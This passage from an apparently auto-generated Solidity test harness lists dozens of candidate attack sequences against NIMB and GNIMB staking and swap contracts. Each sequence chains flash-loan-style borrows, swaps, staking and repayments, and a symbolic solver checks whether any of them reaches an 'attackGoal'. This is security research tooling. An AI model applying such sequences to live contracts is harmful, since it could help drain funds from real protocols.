        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2712(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2713(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2714(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2715(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2716(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2717(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2718(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2719(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2720(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2721(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2722(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2723(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2724(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2725(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2726(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2727(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2728(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2729(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2730(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2731(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2732(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2733(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2734(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2735(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2736(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2737(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2738(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2739(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2740(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2741(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2742(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2743(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2744(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2745(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2746(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2747(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2748(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2749(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2750(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2751(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2752(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2753(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2754(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2755(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2756(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2757(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2758(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2759(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
